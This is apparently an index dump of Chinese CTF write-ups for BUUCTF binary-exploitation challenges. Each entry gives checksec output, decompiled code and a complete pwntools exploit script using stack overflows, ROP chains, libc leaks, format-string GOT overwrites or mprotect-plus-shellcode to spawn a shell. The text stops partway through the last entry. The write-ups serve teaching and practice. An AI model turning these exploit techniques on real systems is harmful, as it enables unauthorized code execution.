[{"title":"ciscn_2019_n_1","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/ciscn_2019_n_1","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"ciscn_2019_n_1","url":"BUUCTF/栈溢出/ciscn_2019_n_1#知识点","content":"浮点数在内存中的表示 "},{"title":"解题分析","type":1,"pageTitle":"ciscn_2019_n_1","url":"BUUCTF/栈溢出/ciscn_2019_n_1#解题分析","content":"checksec结果： ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=ciscn_2019_n_1 RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 73) Symbols No 0 1 ciscn_2019_n_1 Copy 运行了了一下试试，大概就像这样： Let's guess the number.5Its value should be 11.28125 Copy 拖入ida64分析，由于main函数没什么价值，直接看func函数，这边看汇编会好一些 .text:0000000000400676 public func.text:0000000000400676 func proc near ; CODE XREF: main+45↓p.text:0000000000400676.text:0000000000400676 var_30 = byte ptr -30h.text:0000000000400676 var_4 = dword ptr -4.text:0000000000400676.text:0000000000400676 ; __unwind {.text:0000000000400676 push rbp.text:0000000000400677 mov rbp, rsp.text:000000000040067A sub rsp, 30h.text:000000000040067E pxor xmm0, xmm0.text:0000000000400682 movss [rbp+var_4], xmm0.text:0000000000400687 mov edi, offset s ; \"Let's guess the number.\".text:000000000040068C call _puts.text:0000000000400691 lea rax, [rbp+var_30].text:0000000000400695 mov rdi, rax.text:0000000000400698 mov eax, 0.text:000000000040069D call _gets.text:00000000004006A2 movss xmm0, [rbp+var_4].text:00000000004006A7 ucomiss xmm0, cs:dword_4007F4.text:00000000004006AE jp short loc_4006CF.text:00000000004006B0 movss xmm0, [rbp+var_4].text:00000000004006B5 ucomiss xmm0, cs:dword_4007F4.text:00000000004006BC jnz short loc_4006CF.text:00000000004006BE mov edi, offset command ; \"cat /flag\".text:00000000004006C3 mov eax, 0.text:00000000004006C8 call _system.text:00000000004006CD jmp short loc_4006D9.text:00000000004006CF ; ---------------------------------------------------------------------------.text:00000000004006CF.text:00000000004006CF loc_4006CF: ; CODE XREF: func+38↑j.text:00000000004006CF ; func+46↑j.text:00000000004006CF mov edi, offset aItsValueShould ; \"Its value should be 11.28125\".text:00000000004006D4 call _puts.text:00000000004006D9.text:00000000004006D9 loc_4006D9: ; CODE XREF: func+57↑j.text:00000000004006D9 nop.text:00000000004006DA leave.text:00000000004006DB retn.text:00000000004006DB ; } // starts at 400676.text:00000000004006DB func endp Copy func函数的基本逻辑就是让你输入一个字符串，存到var_30这个变量中，然后用var_4这个变量和11.28125比较，如果相等输出flag。 那我们的关键点有： var_30想要覆盖var_4需要填充的字符数浮点数11.28125在内存中的表示 第一点计算比较简单，一个是ptr-30h，一个是ptr-4h，两个减一下就算出相差0x2C。 第二点在ida给我们展示的代码中可以看到，首先把var_4的值放到了xmm0寄存器中，然后将xmm0寄存器内容和cs:dword_4007F4中存放的值作比较。跳转到对应地址可以看到.rodata:00000000004007F4 dword_4007F4 dd 41348000h，说明浮点数11.28125在内存中的表示是41348000h。 脚本如下： from pwn import * is_debug = 0elf = './ciscn_2019_n_1'host = 'node3.buuoj.cn'port = 26033 def main(): if is_debug: sh = process(elf) else: sh = remote(host, port) payload = b'a' * 0x2C + p64(0x41348000) sh.sendlineafter('\\n', payload) print((sh.recvline()).decode()) if __name__ == '__main__': main() Copy "},{"title":"【HarekazeCTF2019】baby_rop","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/HarekazeCTF2019_baby_rop","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"【HarekazeCTF2019】baby_rop","url":"BUUCTF/栈溢出/HarekazeCTF2019_baby_rop#知识点","content":"ROP构造栈溢出覆盖返回地址 "},{"title":"解题分析","type":1,"pageTitle":"【HarekazeCTF2019】baby_rop","url":"BUUCTF/栈溢出/HarekazeCTF2019_baby_rop#解题分析","content":"用checksec看下保护信息可以看到堆栈不可执行 ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=babyrop RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 70) Symbols No 0 1 babyrop Copy 拖入ida64，main函数代码如下： int __cdecl main(int argc, const char **argv, const char **envp){ char v4[16]; // [rsp+0h] [rbp-10h] BYREF system(\"echo -n \\\"What's your name? \\\"\"); __isoc99_scanf(\"%s\", v4); printf(\"Welcome to the Pwn World, %s!\\n\", v4); return 0;} Copy 很明显可以看到scanf可以造成栈溢出，并且在main中调用了system函数。 按下Shift + F12查看下是不是存在字符串/bin/sh，发现存在，最终得到如下信息： system函数的plt地址为0x400490/bin/sh字符串的地址为0x601048 由于需要把字符串/bin/sh传入到system函数中作为参数，所以可以用pop rdi; ret来完成。 用ROPgadget搜索一下 ┌──(kali㉿kali)-[~/Desktop]└─$ ROPgadget --binary babyrop --only \"pop|ret\" Gadgets information============================================================0x000000000040067c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040067e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400680 : pop r14 ; pop r15 ; ret0x0000000000400682 : pop r15 ; ret0x000000000040067b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040067f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400540 : pop rbp ; ret0x0000000000400683 : pop rdi ; ret0x0000000000400681 : pop rsi ; pop r15 ; ret0x000000000040067d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400479 : ret0x00000000004005fa : ret 0xfffe Unique gadgets found: 12 Copy 得到我们需要的pop rdi; ret地址为0x400683 最终得到脚本： from pwn import * is_debug = 0file_name = './babyrop'host = 'node4.buuoj.cn'port = 29679 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) pop_rdi = 0x400683 sys_addr = 0x400490 bin_sh = 0x601048 payload = b'a' * 0x18 + p64(pop_rdi) + p64(bin_sh) +p64(sys_addr) sh.sendlineafter('name? ', payload) sh.interactive() if __name__ == '__main__': main() Copy "},{"title":"bjdctf_2020_babyrop","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/bjdctf_2020_babyrop","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"bjdctf_2020_babyrop","url":"BUUCTF/栈溢出/bjdctf_2020_babyrop#知识点","content":"ROP构造 "},{"title":"解题分析","type":1,"pageTitle":"bjdctf_2020_babyrop","url":"BUUCTF/栈溢出/bjdctf_2020_babyrop#解题分析","content":"checksec，开了NX ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=bjdctf_2020_babyrop RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 73) Symbols No 01bjdctf_2020_babyrop Copy ida64看下，vuln函数如下 ssize_t vuln(){ char buf[32]; // [rsp+0h] [rbp-20h] BYREF puts(\"Pull up your sword and tell me u story!\"); return read(0, buf, 0x64uLL);} Copy 非常明显的栈溢出，左侧没有现成的system函数，需要自己去泄露libc算。看到有puts函数，可以利用puts来泄露puts的got地址。 整理思路如下： 栈溢出泄露puts函数地址计算出system函数地址以及字符串/bin/sh的地址重新调用main函数栈溢出调用system('/bin/sh') 由于是64位的程序，在传参时需要用到寄存器，所以得用ROPgadget查一下。 ┌──(kali㉿kali)-[~/Desktop]└─$ ROPgadget --binary bjdctf_2020_babyrop --only \"pop|ret\" 1 ⨯Gadgets information============================================================0x000000000040072c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400730 : pop r14 ; pop r15 ; ret0x0000000000400732 : pop r15 ; ret0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400590 : pop rbp ; ret0x0000000000400733 : pop rdi ; ret0x0000000000400731 : pop rsi ; pop r15 ; ret0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004004c9 : ret Copy 最终得到脚本如下： from pwn import *from LibcSearcher import * is_debug = 0file_name = './bjdctf_2020_babyrop'host = 'node4.buuoj.cn'port = 28675 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) elf = ELF(file_name) puts_plt = elf.plt['puts'] puts_got = elf.got['puts'] _start_addr = 0x400530 pop_ret = 0x400733 payload1 = b'a' * 0x28 + p64(pop_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr) sh.sendlineafter('story!', payload1) puts_addr = u64(sh.recvline()[:-1].ljust(8, b'\\x00')) libc = LibcSearcher('puts', puts_addr) libc_base = puts_addr - libc.dump('puts') sys_addr = libc_base + libc.dump('system') bin_sh_addr = libc_base + libc.dump('str_bin_sh') payload2 = b'a' * 0x28 + p64(pop_ret) + p64(bin_sh_addr) + p64(sys_addr) sh.sendlineafter('story!', payload2) sh.interactive() if __name__ == '__main__': main() Copy "},{"title":"jarvisoj_level2","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/jarvisoj_level2","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"jarvisoj_level2","url":"BUUCTF/栈溢出/jarvisoj_level2#知识点","content":"栈溢出修改函数返回地址 "},{"title":"解题分析","type":1,"pageTitle":"jarvisoj_level2","url":"BUUCTF/栈溢出/jarvisoj_level2#解题分析","content":"checksec结果： ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=level2 RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 70) Symbols No 0 1 level2 Copy 拖入ida分析，由于main函数没什么价值，直接看vulnerable_function函数 ssize_t vulnerable_function(){ char buf[136]; // [esp+0h] [ebp-88h] BYREF system(\"echo Input:\"); return read(0, buf, 0x100u);} Copy 很明显可以栈溢出，左侧找到函数_system，在字符串里面也看到了/bin/sh 直接加载elf获取system的plt地址，search获取/bin/sh地址，然后溢出调用就行了。 脚本如下： from pwn import * is_debug = 1file_name = './level2'host = 'node3.buuoj.cn'port = 29921 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) elf = ELF(file_name) sys_plt = elf.plt['system'] bin_sh_addr = next(elf.search(b'/bin/sh')) payload = b'a' * 0x8c + p32(sys_plt) + p32(1) + p32(bin_sh_addr) sh.sendlineafter('\\n', payload) sh.interactive() if __name__ == '__main__': main() Copy "},{"title":"ciscn_2019_n_8","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/ciscn_2019_n_8","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"ciscn_2019_n_8","url":"BUUCTF/栈溢出/ciscn_2019_n_8#知识点","content":"QWORD类型变量的长度 "},{"title":"解题分析","type":1,"pageTitle":"ciscn_2019_n_8","url":"BUUCTF/栈溢出/ciscn_2019_n_8#解题分析","content":"checksec结果： ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=ciscn_2019_n_8 RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO Canary found NX enabled PIE enabled No RPATH No RUNPATH 79) Symbols No 0 1 ciscn_2019_n_8 Copy 保护基本都开了。 拖入ida，找到main函数 int __cdecl main(int argc, const char **argv, const char **envp){ int v4; // [esp-14h] [ebp-20h] int v5; // [esp-10h] [ebp-1Ch] var[13] = 0; var[14] = 0; init(); puts(\"What's your name?\"); __isoc99_scanf(\"%s\", var, v4, v5); if ( *(_QWORD *)&var[13] ) { if ( *(_QWORD *)&var[13] == 17LL ) system(\"/bin/sh\"); else printf( \"something wrong! val is %d\", var[0], var[1], var[2], var[3], var[4], var[5], var[6], var[7], var[8], var[9], var[10], var[11], var[12], var[13], var[14]); } else { printf(\"%s, Welcome!\\n\", var); puts(\"Try do something~\"); } return 0;} Copy 很简单的逻辑，输入名字存到var里面，如果var[13]开始的8个字节不等于0就判断这8个字节是不是等于17。如果等于17就获取shell，如果不等于17就输出当前值。 双击var可以获取信息.bss:00004060 var dd 0Fh dup(?) ; DATA XREF: main+28↑o，说明var的每一个成员都是4字节的。 payload：padding + 8字节的17 脚本如下： from pwn import * is_debug = 1file_name = './ciscn_2019_n_8'host = 'node3.buuoj.cn'port = 26220 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) payload = b'a' * 52 + p64(0x11) sh.sendline(payload) sh.interactive() if __name__ == '__main__': main() Copy "},{"title":"【第五空间2019决赛】PWN5","type":0,"sectionRef":"#","url":"BUUCTF/格式化字符串/第五空间2019 决赛PWN5","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"【第五空间2019决赛】PWN5","url":"BUUCTF/格式化字符串/第五空间2019 决赛PWN5#知识点","content":"格式化字符串漏洞利用 "},{"title":"解题分析","type":1,"pageTitle":"【第五空间2019决赛】PWN5","url":"BUUCTF/格式化字符串/第五空间2019 决赛PWN5#解题分析","content":"checksec结果： ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=pwn RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO Canary found NX enabled No PIE No RPATH No RUNPATH No Symbols No 0 2 pwn Copy 拖入ida分析，main源码如下： int __cdecl main(int a1){ unsigned int v1; // eax int result; // eax int fd; // [esp+0h] [ebp-84h] char nptr[16]; // [esp+4h] [ebp-80h] BYREF char buf[100]; // [esp+14h] [ebp-70h] BYREF unsigned int v6; // [esp+78h] [ebp-Ch] int *v7; // [esp+7Ch] [ebp-8h] v7 = &a1; v6 = __readgsdword(0x14u); setvbuf(stdout, 0, 2, 0); v1 = time(0); srand(v1); fd = open(\"/dev/urandom\", 0); read(fd, &dword_804C044, 4u); printf(\"your name:\"); read(0, buf, 0x63u); printf(\"Hello,\"); printf(buf); printf(\"your passwd:\"); read(0, nptr, 0xFu); if ( atoi(nptr) == dword_804C044 ) { puts(\"ok!!\"); system(\"/bin/sh\"); } else { puts(\"fail\"); } result = 0; if ( __readgsdword(0x14u) != v6 ) sub_80493D0(); return result;} Copy 根据源码可知程序流程如下： 输入名字输出'Hello,'加输入的名字输入密码将输入密码和随机生成的4位密码比较，正确就执行system('/bin/sh')，错误就提示错误 观察2个可输入的点，读入长度都没有超过可接收的长度，因此无法直接栈溢出。 观察到名字输出部分代码printf(buf)，存在格式化字符串漏洞。 测试一下，看看偏移 ┌──(kali㉿kali)-[~/Desktop]└─$ ./pwn your name:aaaa--%p--%p--%p--%p--%p--%p--%p--%p--%p--%p--%p--%p--%p--%pHello,aaaa--0xffa5a3e8--0x63--(nil)--0xf7f4dae0--0x3--0xf7f1a410--0x1--(nil)--0x1--0x61616161--0x70252d2d--0x70252d2d--0x70252d2d--0x70252d2d2��your passwd:123fail Copy 可以看到第10个%p处的输出结果是0x61616161，得到偏移量是10。 接下来存在有2种方法可以获取权限： 用fmtstr_payload改写atoi地址，将其改为system地址用fmtstr_payload改写随机的数据 这两种方式的脚本依次如下： exp1： from pwn import * is_debug = 1file_name = './pwn'host = 'node3.buuoj.cn'port = 26031 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) elf = ELF(file_name) atoi_got = elf.got['atoi'] system_plt = elf.plt['system'] payload = fmtstr_payload(10, {atoi_got: system_plt}) sh.sendline(payload) sh.sendline('/bin/sh\\x00') sh.interactive() if __name__ == '__main__': main() Copy exp2： from pwn import * is_debug = 0file_name = './pwn'host = 'node3.buuoj.cn'port = 26031 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) dword_804C044 = 0x804C044 payload = fmtstr_payload(10, {dword_804C044: 0x1111}) sh.sendlineafter('your name', payload) sh.sendlineafter('your passwd',str(0x1111)) sh.interactive() if __name__ == '__main__': main() Copy "},{"title":"jarvisoj_level0","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/jarvisoj_level0","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"jarvisoj_level0","url":"BUUCTF/栈溢出/jarvisoj_level0#知识点","content":"栈溢出覆盖栈中返回地址 "},{"title":"解题分析","type":1,"pageTitle":"jarvisoj_level0","url":"BUUCTF/栈溢出/jarvisoj_level0#解题分析","content":"checksec结果： ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=level0 4 ⨯RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILENo RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 69) Symbols No 0 1 level0 Copy 拖入ida64分析，由于main函数没什么价值，直接看vulnerable_function函数 ssize_t vulnerable_function(){ char buf[128]; // [rsp+0h] [rbp-80h] BYREF return read(0, buf, 0x200uLL);} Copy 很简单的一个函数，读入字符，保存到buf变量中。但是read读入字符数是0x200，buf到栈底距离是0x80，很明显会造成溢出。搜索字符串找到callsystem函数可以获取权限，地址是0x400596。 脚本如下： from pwn import * is_debug = 1elf = './level0'host = 'node3.buuoj.cn'port = 25980 def main(): if is_debug: sh = process(elf) else: sh = remote(host, port) payload = b'a' * 0x88 + p64(0x400596) sh.sendline(payload) sh.interactive() if __name__ == '__main__': main() Copy "},{"title":"bjdctf_2020_babystack","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/bjdctf_2020_babystack","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"bjdctf_2020_babystack","url":"BUUCTF/栈溢出/bjdctf_2020_babystack#知识点","content":"栈溢出覆盖返回地址 "},{"title":"解题分析","type":1,"pageTitle":"bjdctf_2020_babystack","url":"BUUCTF/栈溢出/bjdctf_2020_babystack#解题分析","content":"checksec看一下 ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=bjdctf_2020_babystack RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 74) Symbols No 0 1 bjdctf_2020_babystack Copy 可以溢出，先拖进ida64看看有没有溢出点。 int __cdecl main(int argc, const char **argv, const char **envp){ char buf[12]; // [rsp+0h] [rbp-10h] BYREF size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); LODWORD(nbytes) = 0; puts(\"**********************************\"); puts(\"* Welcome to the BJDCTF! *\"); puts(\"* And Welcome to the bin world! *\"); puts(\"* Let's try to pwn the world! *\"); puts(\"* Please told me u answer loudly!*\"); puts(\"[+]Are u ready?\"); puts(\"[+]Please input the length of your name:\"); __isoc99_scanf(\"%d\", &nbytes); puts(\"[+]What's u name?\"); read(0, buf, (unsigned int)nbytes); return 0;} Copy nbytes是我们读取的名字长度，这个值可以自定义，因此很容易就可以实现栈溢出去覆盖返回地址。 在左边函数列表中发现了后门函数backdoor，该函数的地址为0x4006E6。 最终脚本如下： from pwn import * is_debug = 0file_name = './bjdctf_2020_babystack'host = 'node4.buuoj.cn'port = 26840 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) payload = b'a' * 0x18 + p64(0x4006E6) sh.sendlineafter('name:', '34') sh.sendlineafter('name?', payload) sh.interactive() if __name__ == '__main__': main() Copy "},{"title":"shell_asm","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/shell_asm","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"shell_asm","url":"BUUCTF/栈溢出/shell_asm#知识点","content":"我也不知道（？） "},{"title":"解题分析","type":1,"pageTitle":"shell_asm","url":"BUUCTF/栈溢出/shell_asm#解题分析","content":"checksec，开了NX和PIE ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=shell_asm RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX enabled PIE enabled No RPATH No RUNPATH 72) Symbols No 00shell_asm Copy ida看下，getShell函数如下 int getShell(){ int result; // eax char v1[9]; // [esp-Ch] [ebp-Ch] BYREF strcpy(v1, \"/bin//sh\"); result = 11; __asm { int 80h; LINUX - sys_execve } return result;} Copy 看了代码，我直接疑惑（？）综上所述，就是直接给你shell（？） 跑了一下确实……然后nc上去，还是直接给了shell…… 所以这题要表达什么（？）告诉你shellcode怎么用（？） "},{"title":"not_the_same_3dsctf_2016","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/not_the_same_3dsctf_2016","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"not_the_same_3dsctf_2016","url":"BUUCTF/栈溢出/not_the_same_3dsctf_2016#知识点","content":"mprotect修改内存属性 "},{"title":"解题分析","type":1,"pageTitle":"not_the_same_3dsctf_2016","url":"BUUCTF/栈溢出/not_the_same_3dsctf_2016#解题分析","content":"checksec结果： ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=not_the_same_3dsctf_2016 1 ⨯RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 1991) Symbols No 0 0 not_the_same_3dsctf_2016 Copy 拖入ida，找到main函数 int __cdecl main(int argc, const char **argv, const char **envp){ char v4[45]; // [esp+Fh] [ebp-2Dh] BYREF printf(\"b0r4 v3r s3 7u 4h o b1ch4o m3m0... \"); gets(v4); return 0;} Copy 很明显可以栈溢出。 在main函数上面有一个函数get_secret，看看源码 int get_secret(){ int v0; // esi v0 = fopen(\"flag.txt\", &unk_80CF91B); fgets(&fl4g, 45, v0); return fclose(v0);} Copy 他将flag.txt的内容从文件中读出，保存到fl4g中，双击fl4g可以看到.bss:080ECA2D fl4g db ? ; ; DATA XREF: get_secret+26↑o 说明fl4g在bss段上面。 尝试了一下用栈溢出跳转到get_secret，然后让他溢出跳转到write来输出fl4g中的内容，失败了。 搜了一下存在函数mprotect，这个函数可以修改一段指定内存区域的保护属性。 mprotect小知识 Linux手册：https://man7.org/linux/man-pages/man2/mprotect.2.html 函数原型如下： #include <sys/mmap.h>int mprotect(const void *start, size_t len, int prot); Copy start: 修改的内存的起始地址len: 修改的内存的长度prot: 修改后的属性 PROT_READ（4）: 表示内存段的内容可读PROT_WRITE（2）: 表示内存段的内容可写PROT_EXEC（1）: 表示内存段的内容可执行PROT_NONE（0）: 表示内存段的内容无法访问 调用成功返回0，发生错误返回-1。 由于mprotect有3个参数，我们需要用寄存器传参，用ROPgadget --binary not_the_same_3dsctf_2016 --only \"pop|ret\" | grep pop找一下有3个pop的ret。 看了一下有超级多，看一下mprotect函数的汇编，关于传参的情况 .text:0806ED40 arg_0 = dword ptr 4.text:0806ED40 arg_4 = dword ptr 8.text:0806ED40 arg_8 = dword ptr 0Ch.text:0806ED40.text:0806ED40 ; __unwind {.text:0806ED40 push ebx.text:0806ED41 mov edx, [esp+4+arg_8].text:0806ED45 mov ecx, [esp+4+arg_4].text:0806ED49 mov ebx, [esp+4+arg_0] Copy 三个参数依次是arg_0、arg_4、arg_8，然后将arg_8存到edx中，将arg_4存到ecx中，将arg_0存到ebx中。根据这个规则，要保证参数在pop之后存放的寄存器不会因为这边的mov而导致数据错乱。最后筛选下来符合条件的是0x0806fcc8 : pop esi ; pop ebx ; pop edx ; ret。 我们需要的是将.plt.got表改为可读可写可执行（7）的属性，因此需要知道地址，在ida中按下Ctrl + S即可看到.plt.got表起始地址是0x80EB000 在.plt.got表可读可写可执行后，我们需要将shellcode写入，再执行shellcode，具体步骤如下： 将main函数的返回地址改为函数mprotect的地址通过pop将参数传入mprotect，修改.plt.got表的保护属性将ret的返回地址设置为read的地址通过pop将参数传入read，输入shellcode将ret的返回地址设置为.plt.got的起始地址，执行shellcode 根据以上思路得出脚本如下： from pwn import * is_debug = 1file_name = './not_the_same_3dsctf_2016'host = 'node3.buuoj.cn'port = 28299 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) elf = ELF(file_name) read_addr = elf.symbols['read'] pop3_ret = 0x806fcc8 mpro_addr = 0x806ed40 plt_got_addr = 0x80eb000 shellcode=asm(shellcraft.sh()) payload = b'a' * 0x2d + p32(mpro_addr) + p32(pop3_ret) payload += p32(plt_got_addr) + p32(0x20) + p32(0x7) payload += p32(read_addr) + p32(pop3_ret) payload += p32(0) + p32(plt_got_addr) + p32(len(shellcode)) + p32(plt_got_addr) sh.sendline(payload) sh.sendline(shellcode) sh.interactive() if __name__ == '__main__': main() Copy "},{"title":"pwn1_sctf_2016","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/pwn1_sctf_2016","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"pwn1_sctf_2016","url":"BUUCTF/栈溢出/pwn1_sctf_2016#知识点","content":""},{"title":"解题分析","type":1,"pageTitle":"pwn1_sctf_2016","url":"BUUCTF/栈溢出/pwn1_sctf_2016#解题分析","content":"checksec结果： ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=pwn1_sctf_2016 RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 129) Symbols No 0 3 pwn1_sctf_2016 Copy 拖入ida分析，由于main函数没什么价值，直接看vuln函数 int vuln(){ const char *v0; // eax char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF char v3[4]; // [esp+3Ch] [ebp-1Ch] BYREF char v4[7]; // [esp+40h] [ebp-18h] BYREF char v5; // [esp+47h] [ebp-11h] BYREF char v6[7]; // [esp+48h] [ebp-10h] BYREF char v7[5]; // [esp+4Fh] [ebp-9h] BYREF printf(\"Tell me something about yourself: \"); fgets(s, 32, edata); std::string::operator=(&input, s); std::allocator<char>::allocator(&v5); std::string::string(v4, \"you\", &v5); std::allocator<char>::allocator(v7); std::string::string(v6, \"I\", v7); replace((std::string *)v3); std::string::operator=(&input, v3, v6, v4); std::string::~string(v3); std::string::~string(v6); std::allocator<char>::~allocator(v7); std::string::~string(v4); std::allocator<char>::~allocator(&v5); v0 = (const char *)std::string::c_str((std::string *)&input); strcpy(s, v0); return printf(\"So, %s\\n\", s);} Copy 暂时不看中间一串，头部就是让你输入一个字符串，最大读入长度是32个字符，因为变量s到栈底的距离是3C，所以32个字符不会造成栈溢出。在中间一串结束后最后会输出\"So, \"加上变量s的内容。 中间一串看不懂也没事，找到关键的两个字符串“you”和“I”，那就去试试运行输入看看会发生什么。 ┌──(kali㉿kali)-[~/Desktop]└─$ ./pwn1_sctf_2016 Tell me something about yourself: IhhhSo, youhhh Copy 可以很明显看到，输入的I被替换成了you然后进行输出，也就是说输入的内容被增长了，中间那一堆的代码用处就是把s中的I替换成you。 回到源码，0x3C就是60，我们最大输入32个字符，如果全是I的话最后最大的长度就是96，很明显可以造成溢出并且覆盖到返回地址，这里是一个漏洞点。 能够造成溢出那么就找找有没有后门函数，Shift + F12搜一下就能看到.rodata:080497F0 0000000D C cat flag.txt。这个字符串在函数get_flag中，该函数的地址是0x08048F0D。 有了后门函数，可以覆盖返回地址，那就构造字符串覆盖返回地址跳转。该程序覆盖到返回地址，需要填充的字符数是0x3C + 4个，即64个字符。由于可以用I来替换成you，那么计算得出需要字符I共21个，再随便加个别的字符然后跟上需要跳转的地址，总共是21 + 1 + 4 = 26个字符，没有超出32字符的限制，说明可行。 脚本如下： from pwn import * is_debug = 1elf = './pwn1_sctf_2016'host = 'node3.buuoj.cn'port = 27190 def main(): if is_debug: sh = process(elf) else: sh = remote(host, port) payload = b'I' * 0x15 + b'a' + p32(0x08048F0D) sh.sendline(payload) sh.interactive() if __name__ == '__main__': main() Copy 运行结果： ┌──(kali㉿kali)-[~/Desktop]└─$ python3 exp.py 130 ⨯[+] Starting local process './pwn1_sctf_2016': pid 2346[*] Switching to interactive mode\\x8f\\x04 flag{Th1s_is_A_tEst_f1a9}[*] Got EOF while reading in interactive$ Copy "},{"title":"get_started_3dsctf_2016","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/get_started_3dsctf_2016","content":"","keywords":""},{"title":"知识点","type":1,"pageTitle":"get_started_3dsctf_2016","url":"BUUCTF/栈溢出/get_started_3dsctf_2016#知识点","content":"函数传参 "},{"title":"解题分析","type":1,"pageTitle":"get_started_3dsctf_2016","url":"BUUCTF/栈溢出/get_started_3dsctf_2016#解题分析","content":"checksec结果： ┌──(kali㉿kali)-[~/Desktop]└─$ checksec --file=get_started_3dsctf_2016 RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 1991) Symbols No 0 0 get_started_3dsctf_2016 Copy 拖入ida，找到main函数 int __cdecl main(int argc, const char **argv, const char **envp){ char v4[56]; // [esp+4h] [ebp-38h] BYREF printf(\"Qual a palavrinha magica? \", v4[0]); gets(v4); return 0;} Copy 很明显可以栈溢出。 在main函数上面有一个函数get_flag，看看源码 void __cdecl get_flag(int a1, int a2){ int v2; // esi unsigned __int8 v3; // al int v4; // ecx unsigned __int8 v5; // al if ( a1 == 814536271 && a2 == 425138641 ) { v2 = fopen(\"flag.txt\", \"rt\"); v3 = getc(v2); if ( v3 != 255 ) { v4 = (char)v3; do { putchar(v4); v5 = getc(v2); v4 = (char)v5; } while ( v5 != 255 ); } fclose(v2); }} Copy 符合条件就输出flag。 首先尝试直接跳转到fopen处运行，该处地址为0x80489B8，脚本如下： from pwn import *from LibcSearcher import * is_debug = 1file_name = './get_started_3dsctf_2016'host = 'node3.buuoj.cn'port = 25562 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) flag_add = 0x80489B8 payload = b'a' * 0x38 + p32(flag_add) sh.sendline(payload) print(sh.recvline()) if __name__ == '__main__': main() Copy 执行结果： [+] Starting local process './get_started_3dsctf_2016': pid 1401b'Qual a palavrinha magica? 